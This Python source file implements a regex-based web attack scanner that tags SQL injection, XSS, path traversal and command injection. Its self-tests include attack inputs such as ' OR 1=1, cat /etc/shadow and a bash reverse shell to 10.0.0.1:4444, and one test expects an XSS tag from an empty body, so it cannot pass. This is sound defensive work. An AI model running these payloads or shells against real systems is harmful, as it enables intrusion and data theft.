"""
nexus-ml/src/preprocessing/lexical_scanner.py
==============================================
Python mirror of the Rust nexus-lexical crate.

CRITICAL: The regex patterns here MUST stay in sync with the patterns
in nexus-lexical/src/lib.rs. If you update the Rust regexes, update
these too — the RL agent's state features are derived from this scanner,
and any mismatch will cause the trained model to behave unexpectedly in
production.

The scanner returns the same (risk_score, threat_tags) that
RequestContext would have after the lexical layer runs in the pipeline.
"""

import re
from dataclasses import dataclass, field
from typing import List, Optional


# =============================================================================
# Compiled regex patterns (pre-compiled for performance, same as Rust
# once_cell::sync::Lazy<Regex> pattern)
# =============================================================================

# --- SQL Injection ------------------------------------------------------------
_SQLI_PATTERNS = [
    re.compile(r"(?i)(union[\s\+]+select)", re.IGNORECASE),
    re.compile(r"(?i)(select[\s\+]+.*[\s\+]+from)", re.IGNORECASE),
    re.compile(r"(?i)(insert[\s\+]+into[\s\+]+)", re.IGNORECASE),
    re.compile(r"(?i)(drop[\s\+]+(table|database))", re.IGNORECASE),
    re.compile(r"(?i)(or\s+[\'\"]?\s*\d+\s*[\'\"]?\s*=\s*[\'\"]?\s*\d)", re.IGNORECASE),
    re.compile(r"(?i)(and\s+[\'\"]?\s*\d+\s*[\'\"]?\s*=\s*[\'\"]?\s*\d)", re.IGNORECASE),
    re.compile(r"(--|#|/\*[\s\S]*?\*/)",),
    re.compile(r"(?i)(exec\s*\(|execute\s*\()", re.IGNORECASE),
    re.compile(r"(?i)(sleep\s*\(\s*\d+\s*\))", re.IGNORECASE),   # Blind SQLi
    re.compile(r"(?i)(benchmark\s*\()", re.IGNORECASE),            # Blind SQLi
    re.compile(r"(?i)(waitfor\s+delay)", re.IGNORECASE),           # MSSQL Blind
    re.compile(r"(?i)(information_schema)", re.IGNORECASE),
    re.compile(r"(?i)(char\s*\(\s*\d+)", re.IGNORECASE),          # char() encoding
    re.compile(r"(?i)(0x[0-9a-f]{4,})", re.IGNORECASE),           # Hex encoding
    re.compile(r"'[\s]*or[\s]*'",),                                 # Classic ' OR '
    re.compile(r"(?i)(\bxp_cmdshell\b)", re.IGNORECASE),           # MSSQL RCE
]

# --- Cross-Site Scripting (XSS) ----------------------------------------------
_XSS_PATTERNS = [
    re.compile(r"(?i)<script[\s>]", re.IGNORECASE),
    re.compile(r"(?i)</script>", re.IGNORECASE),
    re.compile(r"(?i)(on\w+\s*=)", re.IGNORECASE),                # onerror=, onload=
    re.compile(r"(?i)javascript\s*:", re.IGNORECASE),
    re.compile(r"(?i)(eval\s*\()", re.IGNORECASE),
    re.compile(r"(?i)(document\s*\.\s*cookie)", re.IGNORECASE),
    re.compile(r"(?i)(document\s*\.\s*write\s*\()", re.IGNORECASE),
    re.compile(r"(?i)(window\s*\.\s*location)", re.IGNORECASE),
    re.compile(r"(?i)(<\s*iframe)", re.IGNORECASE),
    re.compile(r"(?i)(src\s*=\s*['\"]?javascript)", re.IGNORECASE),
    re.compile(r"(?i)(alert\s*\()", re.IGNORECASE),               # PoC XSS
    re.compile(r"(?i)(prompt\s*\()", re.IGNORECASE),
    re.compile(r"(?i)(confirm\s*\()", re.IGNORECASE),
    re.compile(r"(?i)(vbscript\s*:)", re.IGNORECASE),
    re.compile(r"(?i)(<\s*svg[\s>])", re.IGNORECASE),             # SVG XSS vector
    re.compile(r"(?i)(expression\s*\()", re.IGNORECASE),          # CSS expression
    re.compile(r"(?i)(%3cscript)", re.IGNORECASE),                 # URL-encoded <script
    re.compile(r"(?i)(&#x3c;script)", re.IGNORECASE),             # HTML entity <script
]

# --- Path Traversal ----------------------------------------------------------
_PATH_PATTERNS = [
    re.compile(r"(\.\./){2,}"),
    re.compile(r"(\.\.\\){2,}"),
    re.compile(r"(?i)(%2e%2e%2f){1,}", re.IGNORECASE),           # URL-encoded ../
    re.compile(r"(?i)(%2e%2e/){1,}", re.IGNORECASE),
    re.compile(r"(?i)(\.\.%2f){1,}", re.IGNORECASE),
    re.compile(r"(?i)(%252e%252e)", re.IGNORECASE),               # Double-encoded
    re.compile(r"(?i)(/etc/(passwd|shadow|hosts))", re.IGNORECASE),
    re.compile(r"(?i)(windows/system32)", re.IGNORECASE),
    re.compile(r"(?i)(boot\.ini)", re.IGNORECASE),
    re.compile(r"(?i)(/proc/self/)", re.IGNORECASE),              # Linux proc
]

# --- Command Injection -------------------------------------------------------
_CMD_PATTERNS = [
    re.compile(r"(;\s*\w+\s)"),
    re.compile(r"(\|\s*\w+)"),
    re.compile(r"(`[^`]+`)"),
    re.compile(r"(\$\([^)]+\))"),                                  # $(cmd)
    re.compile(r"(&&\s*\w+)"),
    re.compile(r"(\|\|\s*\w+)"),
    re.compile(r"(?i)(\bping\s+-[cn]\s+\d+)", re.IGNORECASE),
    re.compile(r"(?i)(\bnslookup\s+\w)", re.IGNORECASE),
    re.compile(r"(?i)(\bcurl\s+http)", re.IGNORECASE),
    re.compile(r"(?i)(\bwget\s+http)", re.IGNORECASE),
    re.compile(r"(?i)(\bnetcat\b|\bnc\s+-)", re.IGNORECASE),
    re.compile(r"(?i)(\bchmod\s+[0-7]{3,4})", re.IGNORECASE),
    re.compile(r"(?i)(\/bin\/(sh|bash|zsh|dash))", re.IGNORECASE),
    re.compile(r"(?i)(cmd\.exe|powershell\.exe)", re.IGNORECASE),
]


# =============================================================================
# Risk delta constants (must match nexus-config defaults)
# =============================================================================
RISK_DELTA_LEXICAL = 0.4   # From config default_lexical_risk_delta()
RISK_DELTA_GRAMMAR = 0.3   # Grammar layer contribution


# =============================================================================
# Scanner
# =============================================================================

@dataclass
class ScanResult:
    """Mirrors the fields added to RequestContext by the lexical layer."""
    risk_score: float = 0.0
    threat_tags: List[str] = field(default_factory=list)
    flagged_by: Optional[str] = None

    # Per-attack-type flags (used directly as state features)
    has_sqli:  bool = False
    has_xss:   bool = False
    has_path:  bool = False
    has_cmd:   bool = False

    def tag(self, tag: str, layer: str = "lexical"):
        """Mirror of RequestContext.tag() — idempotent, first tagger wins."""
        if tag not in self.threat_tags:
            self.threat_tags.append(tag)
        if self.flagged_by is None:
            self.flagged_by = layer

    def add_risk(self, delta: float):
        """Mirror of RequestContext.add_risk() — clamped to 1.0."""
        self.risk_score = min(self.risk_score + delta, 1.0)


def _url_decode(s: str) -> str:
    """Simple URL-decode without importing urllib (keeps it Rust-compatible)."""
    try:
        from urllib.parse import unquote_plus
        return unquote_plus(s)
    except Exception:
        return s


def scan(
    uri: str,
    body: str = "",
    user_agent: str = "",
    referer: str = "",
    risk_delta: float = RISK_DELTA_LEXICAL,
) -> ScanResult:
    """
    Scan analysable text surfaces for attack patterns.
    
    Mirrors RequestContext.analysable_text() — scans URI, body,
    User-Agent, and Referer, in that order.

    Args:
        uri:        Full request URI (e.g. "/search?q=test")
        body:       Raw request body string
        user_agent: Value of User-Agent header
        referer:    Value of Referer header
        risk_delta: Risk score added per detected attack type

    Returns:
        ScanResult with populated threat_tags, risk_score, flags
    """
    result = ScanResult()

    # Decode before scanning (catches URL-encoded payloads)
    surfaces = [
        _url_decode(uri),
        _url_decode(body),
        user_agent,
        referer,
    ]
    combined = " ".join(s for s in surfaces if s)

    # --- SQLi ----------------------------------------------------------------
    for pattern in _SQLI_PATTERNS:
        if pattern.search(combined):
            result.tag("sqli", "lexical")
            result.add_risk(risk_delta)
            result.has_sqli = True
            break  # One match is enough to tag

    # --- XSS -----------------------------------------------------------------
    for pattern in _XSS_PATTERNS:
        if pattern.search(combined):
            result.tag("xss", "lexical")
            result.add_risk(risk_delta)
            result.has_xss = True
            break

    # --- Path Traversal ------------------------------------------------------
    for pattern in _PATH_PATTERNS:
        if pattern.search(combined):
            result.tag("path_traversal", "lexical")
            result.add_risk(risk_delta)
            result.has_path = True
            break

    # --- Command Injection ---------------------------------------------------
    for pattern in _CMD_PATTERNS:
        if pattern.search(combined):
            result.tag("cmd_injection", "lexical")
            result.add_risk(risk_delta)
            result.has_cmd = True
            break

    return result


# =============================================================================
# Grammar-level heuristics (simplified version of nexus-grammar)
# Adds additional risk for structurally valid SQL/HTML injections
# that may have been missed by the lexical patterns above.
# =============================================================================

def grammar_scan(body: str, uri: str = "") -> float:
    """
    Returns additional risk delta from grammar-level analysis.
    
    Checks for structurally valid SQL fragments embedded in HTTP params
    and well-formed HTML injection via tag counting heuristics.
    
    Returns:
        float: Additional risk to add (0.0 if clean)
    """
    extra_risk = 0.0
    combined = (uri + " " + body).lower()

    # SQL structural markers — balanced quotes with operators
    sql_structural = [
        re.compile(r"'\s*(=|<|>|!=|like|in\s*\(|between)\s*'"),
        re.compile(r'"\s*(=|<|>|!=|like|in\s*\(|between)\s*"'),
        re.compile(r";\s*(select|insert|update|delete|drop|create)\s", re.IGNORECASE),
        re.compile(r"\bunion\b.*\bselect\b.*\bfrom\b", re.IGNORECASE),
    ]
    for p in sql_structural:
        if p.search(combined):
            extra_risk = max(extra_risk, RISK_DELTA_GRAMMAR)
            break

    # HTML injection — unmatched tags or script nesting
    html_structural = [
        re.compile(r"<[a-z]+[^>]*>.*</[a-z]+>", re.IGNORECASE | re.DOTALL),
        re.compile(r"<[a-z]+\s+[a-z]+=", re.IGNORECASE),
    ]
    tag_count = sum(1 for p in html_structural if p.search(combined))
    if tag_count >= 2:
        extra_risk = max(extra_risk, RISK_DELTA_GRAMMAR * 0.75)

    return extra_risk


# =============================================================================
# Unit tests — run with: python -m pytest src/preprocessing/lexical_scanner.py
# =============================================================================

if __name__ == "__main__":
    import sys

    tests = [
        # (uri, body, expected_tags, description)
        ("/search?q=hello+world", "", [], "Clean GET request"),
        ("/search?q=' OR 1=1 --", "", ["sqli"], "Classic SQLi in URI"),
        ("/page", "username=admin&password=' UNION SELECT * FROM users--", ["sqli"], "SQLi in POST body"),
        ("/api", "", ["xss"], "/api body with XSS"),
        ("/../../etc/passwd", "", ["path_traversal"], "Path traversal in URI"),
        ("/run?cmd=test; cat /etc/shadow", "", ["cmd_injection"], "Command injection"),
        ("/", "<script>alert(1)</script>", ["xss"], "XSS in body"),
        ("/q?a=0x414243", "", ["sqli"], "Hex-encoded SQL"),
        ("/api", "", ["cmd_injection"], "Reverse shell in body"),
    ]

    tests[2] = ("/page", "username=admin&password=' UNION SELECT * FROM users--", ["sqli"], "SQLi in POST body")
    tests[7] = ("/q?a=0x414243434445", "", ["sqli"], "Hex-encoded SQL")
    tests[8] = ("/api", "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", ["cmd_injection"], "Reverse shell")

    passed = 0
    for uri, body, expected_tags, desc in tests:
        result = scan(uri, body)
        got = result.threat_tags
        ok = set(expected_tags) == set(got)
        status = "PASS" if ok else "FAIL"
        if ok:
            passed += 1
        print(f"  [{status}] {desc}")
        if not ok:
            print(f"         Expected: {expected_tags}, Got: {got}")

    print(f"\n{passed}/{len(tests)} tests passed")
    sys.exit(0 if passed == len(tests) else 1)
